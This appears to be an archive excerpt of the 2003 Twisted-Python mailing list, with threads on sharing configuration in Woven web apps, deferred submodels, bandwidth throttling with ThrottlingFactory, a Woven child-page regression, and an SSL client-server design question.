
I am writing a Woven app that I would like to make fairly configurable by
the end-user without asking them to change my code. The way I'm doing this
now is with a special class, SiteConfiguration, that is given various data
in the root-level .rpy.

Now, every Page, every Model, and every View should (in my perfect world) be
able to get at this class. There should be only one SiteConfiguration; I'd
like to avoid calling it "global", because I know that word means many
different things. So what I do in my .rpy is:

 cfg = SiteConfiguration(...)
 registry.setComponent(SiteConfiguration, cfg)
 
Then, my site's static.File class sets 'child.registry = self.registry' and
'child.model.registry = self.registry' on everything it returns from
getChild. My Model classes then do some funkiness to find their top-level
parent and get the registry from that; I imagine my Pages could do the same.

But this seems a bit kludgish to me; I'm wondering if there is a more
general way of doing this that would not involve changing the behavior of
static.File.getChild.

Ideas?

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From radix at twistedmatrix.com  Fri Jul 18 11:16:20 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 18 Jul 2003 13:16:20 -0400
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718164422.GC7740@perpetual.moxn.net>
References: <20030718164422.GC7740@perpetual.moxn.net>
Message-ID: <20030718171620.GE1149@radii>

On Fri, Jul 18, 2003 at 04:44:22PM +0000, mesozoic wrote:
> I am writing a Woven app that I would like to make fairly configurable by
> the end-user without asking them to change my code. The way I'm doing this
> now is with a special class, SiteConfiguration, that is given various data
> in the root-level .rpy.
...
>  cfg = SiteConfiguration(...)
>  registry.setComponent(SiteConfiguration, cfg)

I wouldn't even use the registry at all; you can just give the
resource you create in that .rpy access to the SiteConfiguration
instance, and it can do whatever it wants with it.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From itamar at itamarst.org  Fri Jul 18 11:28:21 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 18 Jul 2003 13:28:21 -0400
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718164422.GC7740@perpetual.moxn.net>
References: <20030718164422.GC7740@perpetual.moxn.net>
Message-ID: <20030718132821.71334711.itamar@itamarst.org>

Define a marker interface ISiteConfiguration.

The top-level RPY does:

    request.setComponent(ISiteConfiguration, myConfig)

And then any lower-level Resource can do:

    myConfig = ISiteConfiguration(request)




From m at moshez.org  Fri Jul 18 11:35:37 2003
From: m at moshez.org (Moshe Zadka)
Date: 18 Jul 2003 17:35:37 -0000
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718171620.GE1149@radii>
References: <20030718171620.GE1149@radii>, <20030718164422.GC7740@perpetual.moxn.net>
Message-ID: <20030718173537.18960.qmail@green.zadka.com>

On Fri, 18 Jul 2003, Christopher Armstrong <radix at twistedmatrix.com> wrote:

> On Fri, Jul 18, 2003 at 04:44:22PM +0000, mesozoic wrote:
> > I am writing a Woven app that I would like to make fairly configurable by
> > the end-user without asking them to change my code. The way I'm doing this
> > now is with a special class, SiteConfiguration, that is given various data
> > in the root-level .rpy.
> ...
> >  cfg = SiteConfiguration(...)
> >  registry.setComponent(SiteConfiguration, cfg)
> 
> I wouldn't even use the registry at all; you can just give the
> resource you create in that .rpy access to the SiteConfiguration
> instance, and it can do whatever it wants with it.

Including giving it to its children, in some way or another...
[Possibilities are endless, from overriding putChild to overriding
getChildWithDefault -- since we have no idea how the rest of
your code looks like, its hard to make any specific replies...]
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From radix at twistedmatrix.com  Fri Jul 18 11:58:53 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 18 Jul 2003 13:58:53 -0400
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718132821.71334711.itamar@itamarst.org>
References: <20030718164422.GC7740@perpetual.moxn.net> <20030718132821.71334711.itamar@itamarst.org>
Message-ID: <20030718175853.GF1149@radii>

On Fri, Jul 18, 2003 at 01:28:21PM -0400, Itamar Shtull-Trauring wrote:
> Define a marker interface ISiteConfiguration.
> 
> The top-level RPY does:
> 
>     request.setComponent(ISiteConfiguration, myConfig)

well, the request isn't available in the rpy, only in the methods of
the resource it returns


-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From itamar at itamarst.org  Fri Jul 18 12:12:11 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Fri, 18 Jul 2003 14:12:11 -0400
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718175853.GF1149@radii>
References: <20030718164422.GC7740@perpetual.moxn.net>
	<20030718132821.71334711.itamar@itamarst.org>
	<20030718175853.GF1149@radii>
Message-ID: <20030718141211.41967a09.itamar@itamarst.org>

On Fri, 18 Jul 2003 13:58:53 -0400
Christopher Armstrong <radix at twistedmatrix.com> wrote:

> > The top-level RPY does:
> > 
> >     request.setComponent(ISiteConfiguration, myConfig)
> 
> well, the request isn't available in the rpy, only in the methods of
> the resource it returns

You'd set it in the rpy's resource's getChild, probably.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From dp at twistedmatrix.com  Fri Jul 18 12:28:46 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Fri, 18 Jul 2003 11:28:46 -0700
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718141211.41967a09.itamar@itamarst.org>
References: <20030718164422.GC7740@perpetual.moxn.net> <20030718132821.71334711.itamar@itamarst.org> <20030718175853.GF1149@radii> <20030718141211.41967a09.itamar@itamarst.org>
Message-ID: <AAFF6EEA-B94D-11D7-951E-000A95864FC4@twistedmatrix.com>

On Friday, July 18, 2003, at 11:12AM, Itamar Shtull-Trauring wrote:

> On Fri, 18 Jul 2003 13:58:53 -0400
> Christopher Armstrong <radix at twistedmatrix.com> wrote:
>
>>> The top-level RPY does:
>>>
>>>     request.setComponent(ISiteConfiguration, myConfig)

This is precisely why I made the resource Componentized. It's far more 
convenient and less error-prone to do this than to attempt to make sure 
that a reference to your Configuration object is passed to every single 
child in your system.

>> well, the request isn't available in the rpy, only in the methods of
>> the resource it returns

Maybe it should be. I suppose that makes it possible for people to 
confuse an rpy with a cgi-like thing and write epy like scripts though. 
Maybe it's just an education issue.

> You'd set it in the rpy's resource's getChild, probably.

Unfortunately you have to set it both in getChild and render on the 
root if you want to ensure it is always available. Slightly 
inconvenient.

dp




From glyph at twistedmatrix.com  Fri Jul 18 14:58:14 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Fri, 18 Jul 2003 15:58:14 -0500
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <AAFF6EEA-B94D-11D7-951E-000A95864FC4@twistedmatrix.com>
Message-ID: <8C4DD295-B962-11D7-953B-000393C9700E@twistedmatrix.com>

On Friday, July 18, 2003, at 01:28 PM, Donovan Preston wrote:

> This is precisely why I made the resource Componentized. It's far more 
> convenient and less error-prone to do this than to attempt to make 
> sure that a reference to your Configuration object is passed to every 
> single child in your system.

While I agree that it's better to use a component on the resource than 
to randomly set a junk attribute, I'd also like to caution against 
using this too much.  Unless you're doing something like computing 
relative links, it's a lot safer and less surprising to explicitly pass 
references around in your application.  This might involve more typing, 
but trying to "throw" objects to other parts of your application, using 
the registry, the Componentized request, or the session makes it 
dependent upon an execution context.  That context is often present, 
but it's an undeclared requirement, so it can be a very surprising 
impediment to using a particular kind of resource from some other code 
that does a related but not identical thing.




From radix at twistedmatrix.com  Fri Jul 18 15:05:57 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 18 Jul 2003 17:05:57 -0400
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <8C4DD295-B962-11D7-953B-000393C9700E@twistedmatrix.com>
References: <AAFF6EEA-B94D-11D7-951E-000A95864FC4@twistedmatrix.com> <8C4DD295-B962-11D7-953B-000393C9700E@twistedmatrix.com>
Message-ID: <20030718210557.GG1149@radii>

On Fri, Jul 18, 2003 at 03:58:14PM -0500, Glyph Lefkowitz wrote:
> 
> On Friday, July 18, 2003, at 01:28 PM, Donovan Preston wrote:
> 


I'm pretty sure that there was a freak double-thinko by both glyph and
dovonan here: s/resource/request/ for the marked instances:

> >This is precisely why I made the resource Componentized. It's far more 
                                    ^^^^^^^^ make that request
> >convenient and less error-prone to do this than to attempt to make 
> >sure that a reference to your Configuration object is passed to every 
> >single child in your system.
> 
> While I agree that it's better to use a component on the resource than 
                                                           ^^^^^^^^ here too
> to randomly set a junk attribute, I'd also like to caution against 
> using this too much.  Unless you're doing something like computing 
> relative links, it's a lot safer and less surprising to explicitly pass 
> references around in your application.  This might involve more typing, 
> but trying to "throw" objects to other parts of your application, using 
> the registry, the Componentized request, or the session makes it 
> dependent upon an execution context.  That context is often present, 
> but it's an undeclared requirement, so it can be a very surprising 
> impediment to using a particular kind of resource from some other code 
> that does a related but not identical thing.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From glyph at twistedmatrix.com  Fri Jul 18 19:39:55 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Fri, 18 Jul 2003 20:39:55 -0500
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718210557.GG1149@radii>
Message-ID: <E66BDD72-B989-11D7-953B-000393C9700E@twistedmatrix.com>

On Friday, July 18, 2003, at 04:05 PM, Christopher Armstrong wrote:

> I'm pretty sure that there was a freak double-thinko by both glyph and
> dovonan here: s/resource/request/ for the marked instances:

Good catch.  Yes, indeed :)




From dp at twistedmatrix.com  Sat Jul 19 13:08:35 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Sat, 19 Jul 2003 12:08:35 -0700
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030713022136.GB1862@titus.home.puzzling.org>
References: <20030713022136.GB1862@titus.home.puzzling.org>
Message-ID: <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com>

I apologize for not responding immediately.

On Saturday, July 12, 2003, at 7:21PM, Mary wrote:

> I'm trying to replicate the functionality of http://eyes.puzzling.org/
> (currently powered by a bunch of Python CGI scripts running on an 
> Apache
> webserver) in Woven.
>
> eyes.puzzling.org is a kind of a minimalist blog, with pages that list
> recent entries, the authors of the entries, and so on.

Cool! Have you seen Blog, in the twistedmatrix.com cvs? It is out of 
date and
needs work, but feel free to steal the code/take over the 
project/whatever.

<snip>

> For each author, I would like to generate a /author/AUTHORNAME/ page
> which lists their individual entries. I am trying to create these pages
> from AuthorsPage's getDynamicChild method. The idea is to pass the
> already constructed submodel -- a dictionary representing the 
> individual
> author -- to the IndividualPage object I will construct to represent 
> the
> individual author's page, rather than have IndividualPage make its own
> database query for that information.

That's good -- that sounds like a good design. There are no rules when 
it
comes to Woven architecture, but reusing your Model objects, and model
production logic, across multiple pages sounds like a good idea to me.

> At present, as you can see below, I'm using getSubmodel to retrieve
> the (dictionary) submodel associated with a particular author. However,
> this returns a twisted.web.woven.model.DeferredWrapper instance, rather
> than the dictionary itself. Should I make IndividualPage add callbacks
> to the DeferredWrapper, or am I missing something crucial about
> retrieving submodels or is this model more fundamentally incorrect?

As Moshe said in his reply, currently the URL traversal process is 
synchronous,
so if you need to wait on a Deferred to construct the next URL segment 
Resource
you're going to be doing a lot more work than you should have to. Woven 
attempts
to hide Deferreds from the programmer by pausing rendering and resuming 
it
when the Deferred fires. So, fortunately, things may be simpler than 
they seem.
You can just pass the DeferredWrapper as the Main Model to the next Page
instance you construct, and as long as you are going to be rendering 
that Page
next, Woven will just wait on it as it would any other Deferred.

from twisted.web.woven import page
from twisted.web.woven import model

from twisted.internet import defer
from twisted.internet import reactor


class DeferredProducer(model.MethodModel):
     def wmfactory_someDeferred(self, reqeuest):
         d = defer.Deferred()
         reactor.callLater(0.5, self.produce, d)
         return d

     def produce(self, d):
         d.callback( "Hello, here is some text" )

     def wmfactory_someNotDeferred(self, request):
         return "Hi there"


class MainPage(page.Page):
     template = """<html>
     <h3 model="someNotDeferred" view="Text">qawsf</h3>
     <span model="someDeferred" view="Text">qwensd</span>
</html>"""

     def getDynamicChild(self, name, request):
         return ChildPage(
                     self.model.getSubmodel(request, 'someDeferred'))


class ChildPage(page.Page):
     template = """<html>
     Hello! Our main model is a deferred, so the next node will have to 
wait
     <span model="." view="Text">ncxnz</span>
</html>"""


resource = MainPage(DeferredProducer())




From radix at twistedmatrix.com  Sat Jul 19 14:15:26 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Sat, 19 Jul 2003 16:15:26 -0400
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com>
References: <20030713022136.GB1862@titus.home.puzzling.org> <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com>
Message-ID: <20030719201526.GA1274@radii>

On Sat, Jul 19, 2003 at 12:08:35PM -0700, Donovan Preston wrote:

> As Moshe said in his reply, currently the URL traversal process is
> synchronous, so if you need to wait on a Deferred to construct the
> next URL segment Resource you're going to be doing a lot more work
> than you should have to. 

However, there is (now) a twisted.web.util.DeferredResource. Any time
a Resource is expected of you, but all you have is a Deferred that
will eventually result in a Resource, you can wrap the Deferred up in
one of these babies, and it'll DTRT. It's not necessary most of the
time, but it can be extremely useful.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From dp at twistedmatrix.com  Sat Jul 19 16:24:38 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Sat, 19 Jul 2003 15:24:38 -0700
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030719201526.GA1274@radii>
References: <20030713022136.GB1862@titus.home.puzzling.org> <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com> <20030719201526.GA1274@radii>
Message-ID: <C8D0F2DA-BA37-11D7-8547-000A95864FC4@twistedmatrix.com>

On Saturday, July 19, 2003, at 1:15PM, Christopher Armstrong wrote:

> On Sat, Jul 19, 2003 at 12:08:35PM -0700, Donovan Preston wrote:
>
>> As Moshe said in his reply, currently the URL traversal process is
>> synchronous, so if you need to wait on a Deferred to construct the
>> next URL segment Resource you're going to be doing a lot more work
>> than you should have to.
>
> However, there is (now) a twisted.web.util.DeferredResource. Any time
> a Resource is expected of you, but all you have is a Deferred that
> will eventually result in a Resource, you can wrap the Deferred up in
> one of these babies, and it'll DTRT. It's not necessary most of the
> time, but it can be extremely useful.

Thank you for moving that into util. However, it doesn't support 
chaining -- the thing that is returned will be rendered. So it's no 
different than what I suggested.

dp




From radix at twistedmatrix.com  Sat Jul 19 16:39:05 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Sat, 19 Jul 2003 18:39:05 -0400
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <C8D0F2DA-BA37-11D7-8547-000A95864FC4@twistedmatrix.com>
References: <20030713022136.GB1862@titus.home.puzzling.org> <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com> <20030719201526.GA1274@radii> <C8D0F2DA-BA37-11D7-8547-000A95864FC4@twistedmatrix.com>
Message-ID: <20030719223905.GB1274@radii>

On Sat, Jul 19, 2003 at 03:24:38PM -0700, Donovan Preston wrote:
> 
> On Saturday, July 19, 2003, at 1:15PM, Christopher Armstrong wrote:
> 
> >On Sat, Jul 19, 2003 at 12:08:35PM -0700, Donovan Preston wrote:
> >
> >>As Moshe said in his reply, currently the URL traversal process is
> >>synchronous, so if you need to wait on a Deferred to construct the
> >>next URL segment Resource you're going to be doing a lot more work
> >>than you should have to.
> >
> >However, there is (now) a twisted.web.util.DeferredResource. Any time
> >a Resource is expected of you, but all you have is a Deferred that
> >will eventually result in a Resource, you can wrap the Deferred up in
> >one of these babies, and it'll DTRT. It's not necessary most of the
> >time, but it can be extremely useful.
> 
> Thank you for moving that into util. However, it doesn't support 
> chaining -- the thing that is returned will be rendered. So it's no 
> different than what I suggested.

Chaining? I don't understand. It can be getChilded, if that's what you
mean. Or do you mean a DeferredResource wrapping a Deferred wrapping a
DeferredResource wrapping a Deferred resulting in something else? I
don't see why that would be a problem, but I haven't tried it.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From dp at twistedmatrix.com  Sat Jul 19 16:56:18 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Sat, 19 Jul 2003 15:56:18 -0700
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030719223905.GB1274@radii>
References: <20030713022136.GB1862@titus.home.puzzling.org> <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com> <20030719201526.GA1274@radii> <C8D0F2DA-BA37-11D7-8547-000A95864FC4@twistedmatrix.com> <20030719223905.GB1274@radii>
Message-ID: <353B0296-BA3C-11D7-8547-000A95864FC4@twistedmatrix.com>

On Saturday, July 19, 2003, at 3:39PM, Christopher Armstrong wrote:
>
> Chaining? I don't understand. It can be getChilded, if that's what you
> mean.

Awesome, it can! I couldn't possibly see how this would have worked, 
but it does!

Thanks :-)

dp




From joel.vennin at wanadoo.fr  Sat Jul 19 19:20:09 2003
From: joel.vennin at wanadoo.fr (=?iso-8859-1?q?Jo=EBl=20Vennin?=)
Date: Sun, 20 Jul 2003 03:20:09 +0200
Subject: [Twisted-Python] htp example and twisted CPU usage
Message-ID: <200307200320.16434.joel.vennin@wanadoo.fr>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hello all,

        I'm making an application with twisted and i have some problem with 
it.

I need to be able to limit bandwidth for a group of connection. A group of
connection can be "incoming client" (client connect to the server) and/or
"outcoming client" (server connect to the client).

Another request is to limit the "global bandwidth" upload and download.

I've take a look at the htb module in twisted.protocols but i'm not convinced
about it.

About CPU usage, i've tryed the example shaper which use htb, and when i
download something twisted take all my cpu.

If someone can help me about my request and can explain me why shaper example
take lots of cpu ...

Thanks for your reply

Jol
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.2 (GNU/Linux)

iD8DBQE/Ge5QOzJ7itUoJpQRAsHNAJ0R0SkKHW/1rKTN+hOQJq13QXM2VQCfYA3y
5eMvLn5qhH3y69sGCd5LaPM=
=bw7I
-----END PGP SIGNATURE-----




From andrew-twisted at puzzling.org  Sun Jul 20 02:42:35 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sun, 20 Jul 2003 18:42:35 +1000
Subject: [Twisted-Python] htp example and twisted CPU usage
In-Reply-To: <200307200320.16434.joel.vennin@wanadoo.fr>
References: <200307200320.16434.joel.vennin@wanadoo.fr>
Message-ID: <20030720084235.GA10749@frobozz>

On Sun, Jul 20, 2003 at 03:20:09AM +0200, Jo?l Vennin wrote:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
> 
> Hello all,
> 
>         I'm making an application with twisted and i have some problem with 
> it.
> 
> I need to be able to limit bandwidth for a group of connection. A group of
> connection can be "incoming client" (client connect to the server) and/or
> "outcoming client" (server connect to the client).
> 
> Another request is to limit the "global bandwidth" upload and download.
> 
> I've take a look at the htb module in twisted.protocols but i'm not convinced
> about it.

Specifically, look at twisted.protocols.policies.  There's a
ThrottlingFactory in there that might help you.

-Andrew.




From joel.vennin at wanadoo.fr  Sun Jul 20 05:46:14 2003
From: joel.vennin at wanadoo.fr (=?iso-8859-1?q?Jo=EBl=20Vennin?=)
Date: Sun, 20 Jul 2003 13:46:14 +0200
Subject: [Twisted-Python] Throttling Factory Problem ...
Message-ID: <200307201346.17206.joel.vennin@wanadoo.fr>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hello all, 

I'm making an example to limit bandwidth with ThrottlingFactory. I've a server 
and a client. Client and server make echo. So it's an infinite process. I've 
limited the bandwith to 1Ko/s.

The problem is that the client send a lot's of data  (more than the limited 
bandwidth) during a little time. The server get all the data (more than the 
limited bandwith) and after each wait a long of time before send/received 
something.


Maybe i miss something, can you help me.

Thank you, jol


client.py:
from twisted.protocols import policies
from twisted.internet import protocol, reactor

class SenderProtocol(protocol.Protocol):

    def connectionMade(self):
        self.transport.registerProducer (self, 1)
        self.sendSomething ()

    def pauseProducing(self):
        print "Sender Protocol make a Pause"

    def resumeProducing(self):
        print "Sender Protocol make a Resume"

    def stopProducing(self):
        pass

    def sendSomething (self):
        self.transport.write (500 * "c")

    def dataReceived(self, data):
        self.transport.write(data)

    
class Client(protocol.ClientFactory):

    protocol = SenderProtocol
    
client = Client()
tClient = policies.ThrottlingFactory(client, readLimit=1000)

#port = reactor.listenTCP (7000, tServer, interface="127.0.0.1")

port = reactor.connectTCP ("127.0.0.1", 7000, tClient)

reactor.run ()




server.py:
from twisted.protocols import policies
from twisted.internet import protocol, reactor

class EchoProtocol(protocol.Protocol):

    def connectionMade(self):
        self.transport.registerProducer (self, 1)
        
    def pauseProducing(self):
        print "Echo Protocol make a Pause"

    def resumeProducing(self):
        print "Echo Protocol make a Resume"

    def stopProducing(self):
        pass

    def dataReceived(self, data):
        self.transport.write(data)

    
class Server(protocol.ServerFactory):

    protocol = EchoProtocol
    

server = Server()
tServer = policies.ThrottlingFactory(server, writeLimit=1000, readLimit=1000)

port = reactor.listenTCP (7000, tServer, interface="127.0.0.1")
reactor.run ()

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.2 (GNU/Linux)

iD8DBQE/GoEJOzJ7itUoJpQRAgHgAJ9uDoy6Rj13J4mNC1PUp/GbhDMoWACdGv5/
KO7Hj3TchnGjizz3tM5l9jw=
=swOH
-----END PGP SIGNATURE-----




From oisin at enginesofcreation.ie  Sun Jul 20 06:31:31 2003
From: oisin at enginesofcreation.ie (Oisin Mulvihill)
Date: Sun, 20 Jul 2003 13:31:31 +0100
Subject: [Twisted-Python] Re: help, my woven web app won't work on win32 but will on linux!
In-Reply-To: <3F17D99C.9000908@enginesofcreation.ie>
References: <3F17D99C.9000908@enginesofcreation.ie>
Message-ID: <3F1A8BA3.8030407@enginesofcreation.ie>

Hi,

Well I have had various comments that the code I attached
does not work at all. I tried it on my osx machine with the
twisted 1.0.6 and Twisted-1.0.7alpha2 and found my code
didn't work on windows and linux machines. My suse linux
machine has Twisted-1.0.5 and this is the only machine on
which my program works. I installed 1.0.5 on my osx machine
and low and behold my program works.

I decided to try the "Page in depth" example on which my code
is based to see if I could track the problem. The index.rpy contains
this example. This example does not now work in 1.0.6 and
1.0.7alpha.

When you run this example with 1.0.5 and you can click on the
"fred" or "bob" link you get the following urls and the example
works:

http://localhost:20808/fred
http://localhost:20808/bob

This is what the woven page in depth documentation says and
it works.

If you run this example with 1.0.6/7 you get "resource not found"
error. If however you go to the following url first

http://localhost:20808/index.rpy/

and then click on the "fred" or "bob" link, you get the follow urls
and the example works:

http://localhost:20808/index.rpy/fred/
http://localhost:20808/index.rpy/bob/

This is not what the documentation says should happen. This
appears to be a bug in the new twisted versions. Has something
changed, that means woven child page methods no longer work,
as they did in twisted 1.0.5.

Can someone please shed some light on this?

Thanks,

om




Oisin Mulvihill wrote:

> Hi,
>
> I've produced a small model of my program which hightlights
> the problem I'm having. Attached are two files main.py and
> index.rpy. To run the web app run main and make sure index.rpy
> is in the same directory. Then point your web browser to
> http://localhost:20808
>
> On linux I can click on the web buttons and the app works
> fine. One windows (I'm using win2k) I simply get
> "No Such Resource, File not found".
>
> The button press issues a post and this shows up as the url
> "http://localhost:20808/control?action=set_view&view=view1"
>
> When you look at the MyPage class in index.rpy I have a
> wchild_control method. This method is called on linux and
> I then process the request and take the required action.
>
> On windows the wchild_control method does not appear to be
> called at all and I don't know why.
>
> Can anyone shed any light on this problem?
>
> Thanks,
>
>
> om
>
> ------------------------------------------------------------------------
>
> import time import urlparse import twisted.web.server from 
> twisted.web.woven import view from twisted.web.woven import page from 
> twisted.web.woven import model from twisted.web.woven import input 
> from twisted.web.microdom import lmx from twisted.web.woven import 
> widgets from twisted.web.woven import controller from twisted.python 
> import components # # Set up the session I'll be using: # class 
> IPreferences(components.Interface): pass class 
> Preferences(components.Adapter): __implements__ = IPreferences 
> components.registerAdapter(Preferences, twisted.web.server.Session, 
> IPreferences) class MyModel(model.MethodModel): """ """ pass class 
> NavigationControlsDisplay(view.View): template = """
>
>  
>  
> """ class View1(view.View): """ """ template = """
>
> View One
>
> """ class View2(view.View): """ """ template = """
>
> View Two
>
> """ class MyPage(page.Page): """ """ template ="""
> """ def wvfactory_current_view(self, request, node, model): 
> print("cafemonitor.CafePage.wvfactory_current_view") prefs = 
> request.getSession(IPreferences) view = getattr(prefs, 
> 'current_view','live_view') print("Selecting view <%s>." % view) if 
> view == "view1": print("Returning View1.") return View1(model) elif 
> view == "view2": print("Returning View2.") return View2(model) else: 
> print("unknown view <%s>. Returning View1." % view) return 
> View1(model) def wchild_control(self, request): """This is a fake 
> /control subdirectory used to control a specific machine. request - 
> action: new, complete, void, restore. """ print("wchild_control - 
> request.args <%s>." % str(request.args)) action = 
> request.args.get("action", 0)[0] if action == "set_view": prefs = 
> request.getSession(IPreferences) view = request.args.get("view", 0)[0] 
> print("Setting new view from navigation menu selection <%s>." % view) 
> prefs.current_view = view else: print("unknown action <%s>." % action) 
> return self resource = MyPage(MyModel()) 
> resource.setSubviewFactory("navigation", NavigationControlsDisplay)
>
>------------------------------------------------------------------------
>
>#!/usr/bin/env python
>from twisted.internet import reactor
>from twisted.internet.app import Application
>from twisted.web import static, server, script
>
>def main():
>	"""Run the xml rpc server.
>	"""
>	app = Application("CafeMonitor")
>
>	root = static.File("./")
>	root.processors = {
>		'.rpy': script.ResourceScript,
>		}
>
>	app.listenTCP(
>		port=20808,
>		factory=server.Site(root),
>		interface="localhost"
>	)
>	print("Web Frontend - <%s:%s>." % ("localhost", "20808"))
>	app.run(0)
>	
>if __name__ == '__main__':
>	main()
>	
>  
>

-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: main.py
URL: </pipermail/twisted-python/attachments/20030720/844266e4/attachment.ksh>
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: index.rpy
URL: </pipermail/twisted-python/attachments/20030720/844266e4/attachment-0001.ksh>

From exarkun at intarweb.us  Sun Jul 20 14:25:37 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Sun, 20 Jul 2003 16:25:37 -0400
Subject: [Twisted-Python] Throttling Factory Problem ...
In-Reply-To: <200307201346.17206.joel.vennin@wanadoo.fr>
References: <200307201346.17206.joel.vennin@wanadoo.fr>
Message-ID: <20030720202537.GA645@intarweb.us>

On Sun, Jul 20, 2003 at 01:46:14PM +0200, Jo?l Vennin wrote:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
> 
> Hello all, 
> 
> I'm making an example to limit bandwidth with ThrottlingFactory. I've a server 
> and a client. Client and server make echo. So it's an infinite process. I've 
> limited the bandwith to 1Ko/s.
> 
> The problem is that the client send a lot's of data  (more than the limited 
> bandwidth) during a little time. The server get all the data (more than the 
> limited bandwith) and after each wait a long of time before send/received 
> something.
> 
> 
> Maybe i miss something, can you help me.
> 

  You've not actually made your protocols *respect* the limits being imposed
on it -- they just print out a message and merrily continue on their way.

  One way to do this correctly would be to set a flag in pauseProducing();
when sendSomething() is called and the flag is set, data should be held in a
buffer instead of written to the transport; when resumeProducing() is
called, any data in the buffer should be written to the transport.

  A couple things I'd like to point out: you cannot limit the number of
bytes per unit time you receive this way; to do proper limiting of that, you
need a router sitting somewhere upstream of your connection.  Second, if you
want to foist throttling onto arbitrary protocols/applications, this may not
be the best way to go about it; an external "wrapper" program can be used to
throttle an application or group of applications, such as trickled, may be
easier.  Of course, if you want to force everyone everywhere to use the
throttled version, doing it in-process is probably the only way to go.

  Hope this helps,

  Jp

-- 
"If you find a neighbor in need, you're responsible for serving that
neighbor in need, you're responsible for loving a neighbor just like you'd
like to love yourself." -- George W. Bush, Sept. 16, 2002
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030720/1c09cca3/attachment.sig>

From alienoid at is.lg.ua  Sun Jul 20 14:41:01 2003
From: alienoid at is.lg.ua (Ruslan Spivak)
Date: Sun, 20 Jul 2003 23:41:01 +0300
Subject: [Twisted-Python] client-server communication + ssl + wxpython: newbie question, help
 please
Message-ID: <3F1AFE5D.5050105@is.lg.ua>

Hello, twisted users!

I'm newbie to twisted and after reading documentation feel somewhat a 
little bit confused, don't know where to start.
Can you give an advice on the following:

I need to have a server and a GUI client(wxpython), which communicates 
using ssl.
Server:
    - it should take requests for establishing connection from a lot of 
GUI clients using ssl
    - the request for connection method will pass to server simple types 
(strings and dicts)
    - server will ask radius  server if such user exists, and if so then 
it writes some info to database(MySQL) and adds some rules to firewall. 
If such user doesn't exist in radius, then it raises exception to remote 
client or just return error code.
    - If client succeded in connection, then server should every 3 
minutes call method 'checkpoint' on client. If it doesn't receive 
response from client, it deletes rules from firewall and writes some 
info to database.

Client:
     - wxpython gui based client, that tries to connect to remote server 
using ssl(Connection means connecting to some port on the server, 
passing parameters to remote method 'connect' and if there is no 
exception or return code == 1, connection is successfull and message 
printed to happy user).
     - client contains method that will be periodically(each 3 minutes) 
called by server after successful connection

I just don't know where to start. Should client implement Root.pb as 
from Chapter 5(Perspective broker), so that it can pass reference to 
